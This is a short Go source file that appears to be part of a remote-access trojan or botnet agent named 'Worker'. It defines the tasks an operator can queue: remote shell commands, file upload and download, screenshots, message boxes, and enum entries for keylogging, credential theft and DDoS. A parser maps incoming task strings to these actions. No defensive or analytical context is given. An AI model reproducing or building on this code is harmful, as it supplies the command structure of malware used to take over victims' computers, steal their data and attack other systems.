package main

import (
	"Worker/utils"
	"sort"
	"time"
)

type Job struct {
	Id      int       `json:"id"`
	Todo    string    `json:"todo"`
	IsDone  bool      `json:"is_done"`
	Created time.Time `json:"created"`
}

type JobType int

const (
	UNKNOWN JobType = iota
	SHELL_CMD
	UPLOAD
	DOWNLOAD
	CHDIR
	SLEEP
	BOOST
	SCREENSHOT
	KEYLOGGER
	DDOS
	CREDENTIALS
	MSG_BOX
)

func (j *Job) parse() (JobType, []string) {
	values := utils.SplitArgsStr(j.Todo)
	if len(values) == 0 {
		return UNKNOWN, nil
	}
	jobType := values[0]
	jobArgs := values[1:]
	n := len(jobArgs)
	// TODO: use map with jobType and argsCount?
	if jobType == "cmd" {
		return SHELL_CMD, jobArgs
	} else if jobType == "upload" && n == 1 {
		return UPLOAD, jobArgs
	} else if jobType == "download" && n == 2 {
		return DOWNLOAD, jobArgs
	} else if jobType == "sleep" && n == 1 {
		return SLEEP, jobArgs
	} else if jobType == "boost" && n == 1 {
		return BOOST, jobArgs
	} else if jobType == "chdir" && n == 1 {
		return CHDIR, jobArgs
	} else if jobType == "msgbox" && n == 2 {
		return MSG_BOX, jobArgs
	} else if jobType == "shot" {
		return SCREENSHOT, nil
	}
	return UNKNOWN, nil
}

func sortJobsByTime(jobs []Job) {
	sort.Slice(jobs, func(i, j int) bool {
		return jobs[i].Created.Before(jobs[j].Created)
	})
}